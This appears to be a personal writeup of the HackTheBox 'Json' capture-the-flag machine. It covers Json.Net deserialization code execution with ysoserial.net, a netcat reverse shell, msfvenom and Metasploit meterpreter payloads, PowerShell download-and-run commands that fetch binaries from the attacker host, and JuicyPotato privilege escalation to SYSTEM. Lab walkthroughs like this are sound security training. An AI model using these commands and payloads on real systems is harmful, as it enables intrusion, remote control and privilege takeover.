---
title: "HackTheBox: Json Writeup"
date: 2020-02-14 18:36:00
description: "Writeup for the Json machine at HackTheBox."
tags: [ "HackTheBox", "CTF" ]
images: []
---

[Json](https://www.hackthebox.eu/home/machines/profile/210) is a vulnerable Windows machine hosted over at [HackTheBox](https://www.hackthebox.eu/) with a difficulty rating of 5.1 out of 10. It hosts a webserver which exposes an endpoint that deserializes JSON payloads without verifying them. This leads to arbitary code execution which can be used to get access to the machine. From there, all that's necessary is to play with a certain ground vegetable to retrieve the root flag.

<!--more-->

### Enumeration

The initial portscan reveals a webserver on port 80 and a FTP server on port 21. Anonymous FTP wasn't an option, so I moved onto the webserver after adding the machine to my hosts file.

```text
kali@kali:~$ sudo nmap -sC -sV -sT 10.10.10.158
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-13 08:30 EST
Nmap scan report for json.htb (10.10.10.158)
Host is up (0.054s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Json HTB
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
```

Navigating to `json.htb` shows a web dashboard for a couple seconds before redirecting to a login page.

{{< figure src="/images/htb/json/login-panel.png" alt="Login panel for json.htb" caption="Login page on the webserver" >}}

Typing in some arbitrary words into the login mask, I observed the network panel inside the developer tools to find out what's going on in the background during login attempts. The browser launches a POST request to the `/api/token` endpoint. The credentials in the login mask are sent in the request body as a JSON-formatted object. The endpoint then returns a string indicating success or failure.

There is definitely some client-side validation of the response body going on so my next step was to investigate the origin of the request. Switching to the console tab, an object got printed to the console at the time of the request against the `/api/token` endpoint. This gave me a direct link to the script that launched the request, namely `app.min.js`.

{{< figure src="/images/htb/json/console-obj.png" alt="Developer console showing output of token endpoint" caption="Response from the token endpoint printed to console" >}}

The script is obfuscated. Manual deobfuscation takes a bit of effort, and could probably be simplified by the use of some tools. It was good practice for me to do it manually regardless. After deobfuscation, I took note of another endpoint: `/api/Accounts`. You can find the fully deobfuscated script in my [CTF snippet repository](https://github.com/JoogsWasTaken/ctf-snippets/tree/master/HTB/Json). The following code block in my deobfuscated script is what launches the request.

```js
var oauthcookie = cookie.get("OAuth2");

if (oauthcookie) {
    // vulnerable endpoint
    http.get("/api/Account/", {
        headers: {
            'Bearer': oauthcookie
        }
    })
    // more code goes here...
}
```

Setting the value of the `Bearer` header to something arbitrary and launching a request against the `/api/Accounts` endpoint returns an error.

```text
kali@kali:~$ curl -H "Bearer:foobar" http://json.htb/api/Account
{"Message":"An error has occurred.","ExceptionMessage":"Cannot deserialize Json.Net Object","ExceptionType":"System.Exception","StackTrace":null}
```

A quick search shows that Json.Net refers to a [JSON framework for .NET by Newtonsoft](https://www.newtonsoft.com/json). The error hints at a JSON deserialization issue. My next guess was to try some other payloads, ideally formatted as JSON.

```text
kali@kali:~$ curl -H 'Bearer:{"foo":"bar"}' http://json.htb/api/Account
{"Message":"An error has occurred.","ExceptionMessage":"Invalid format base64","ExceptionType":"System.Exception","StackTrace":null}
```

Encoding the payload as Base64 is the final step to getting the endpoint to accept it. It then echoes the payload back to the client.

```text
kali@kali:~$ curl -H "Bearer:$(echo -n "{\"foo\":\"bar\"}" | base64)" http://json.htb/api/Account
{"foo":"bar"}
```

### Code execution via JSON deserialization

A [research paper](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf) by Hewlett Packard Enterprise security researchers on deserialization of untrusted data delves into the testing of various JSON framework and showing potential security vulnerabilities. One of those frameworks happens to be Json.Net. The paper shows that it's possible to add a special `$type` property to a JSON-formatted object which the Json.Net deserializer can use to instantiate objects that are part of the .NET framework. This feature is disabled by default, and even when enabled, the source of the payload should be verified before deserializing it as it can lead to arbitary code execution for certain objects.

Classes and objects that enable arbitary code execution are called gadgets. Fortunately, no manual labor is required as there exists a tool to create these kinds of JSON payloads: [ysoserial.net](https://github.com/pwntester/ysoserial.net). I compiled the project on my Windows host and explored my objects. The program supports multiple gadgets, two of which are compatible with Json.Net. I created a simple payload that pings my local machine.

```text
PS> .\ysoserial.exe -g WindowsIdentity -f Json.Net -c "ping -n 4 10.10.##.##" -o base64
ewogICAgICAgICAgICAgICAgICAgICckdHlwZSc6ICdTeXN0ZW0uU2VjdXJpdHkuUHJpbm...
```

I sent the payload to the `/api/Accounts` endpoint and captured incoming traffic, and after a little while I was pinged by the remote machine. I grabbed a PowerShell reverse shell from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell) and fed it into ysoserial.net. 

```text
PS> cat payload.ps1 | .\ysoserial.exe -g WindowsIdentity -f Json.Net -s -o base64
ewogICAgICAgICAgICAgICAgICAgICckdHlwZSc6ICdTeXN0ZW0uU2VjdXJpdHkuUHJpbm...
```

```text
kali@kali:~$ nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.10.##.##] from (UNKNOWN) [10.10.10.158] 49908
whoami
json\userpool
```

And after some trial and error, I found myself in the remote machine. There's two user accounts: `superadmin` and `userpool`. Navigating to the desktop of `userpool` provides the user flag.

```text
PS C:\Users\userpool\Desktop> dir       


    Directory: C:\Users\userpool\Desktop


Mode                LastWriteTime     Length Name

----                -------------     ------ ----

-a---         5/22/2019   5:07 PM         32 user.txt


PS C:\Users\userpool\Desktop> cat user.txt
34459###########################
```

### Abusing the golden privileges

The machine is running on Windows Server 2012. Checking the privileges of the `userpool` account shows that the account has the impersonation privilege. This means that I could use [JuicyPotato](https://github.com/ohpe/juicy-potato) for privilege escalation.

```text
PS C:\Users\userpool\Desktop> systeminfo

Host Name:                 JSON
OS Name:                   Microsoft Windows Server 2012 R2 Datacenter
...

PS C:\Users\userpool\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
...
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

I used `msfvenom` as a quick way to generate a binary that spawns a reverse shell that integrates nicely with the Metasploit framework. After downloading all binaries to the remote machine and setting up Metasploit to listen to incoming connections, I ran JuicyPotato using a [CLSID from the official repository](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2012_Datacenter).

On my local machine:

```text
kali@kali:~$ msfvenom -p windows/meterpreter/reverse_tcp lport=4243 lhost=10.10.##.## -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
kali@kali:~$ msfconsole -q
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.10.##.##
LHOST => 10.10.##.##
msf5 exploit(multi/handler) > set LPORT 4243
LPORT => 4243
msf5 exploit(multi/handler) > set RHOST json.htb
RHOST => json.htb
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.##.##:4243
```

On the remote machine:

```text
PS C:\Users\userpool\temp> (New-Object System.Net.WebClient).DownloadFile("http://10.10.##.##:8000/p.exe","C:\Users\userpool\temp\p.exe")
PS C:\Users\userpool\temp> (New-Object System.Net.WebClient).DownloadFile("http://10.10.##.##:8000/sh.exe","C:\Users\userpool\temp\sh.exe")
PS C:\Users\userpool\temp> .\p.exe -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}" -t * -p "C:\Users\userpool\temp\sh.exe" -l 9090
Testing {C49E32C6-BC8B-11d2-85D4-00105A1F8304} 9090
....
[+] authresult 0
{C49E32C6-BC8B-11d2-85D4-00105A1F8304};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

Note the file names above. `p.exe` is the JuicyPotato binary and `sh.exe` is the reverse shell provided by `msfvenom`. I had to rename the reverse shell binary as Windows would not allow any files with "malicious" names. That or I just got really unlucky while transmitting my files. Finally, it is as simple as dropping into the directory of the `superadmin` user.

```text
meterpreter > shell
Process 3044 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\superadmin\Desktop>whoami
whoami
nt authority\system

C:\Users\superadmin\Desktop>more root.txt
more root.txt
3cc85###########################
```

### Conclusion

This was my first Windows box and I enjoyed learning about JSON and, more generally, deserialization issues as an attack vector a lot. Even though I'm not much of a fan of Meterpreter, I ended up using it because of stability issues I encountered with the box itself. Also I highly recommend looking at other writeups since the "intended" path to the root flag incorporated reverse engineering, however I wasn't able to get there in time. Thanks to [Cyb3rb0b](https://www.hackthebox.eu/home/users/profile/61047) for this box and everyone who helped me on my way to `NT AUTHORITY\SYSTEM`.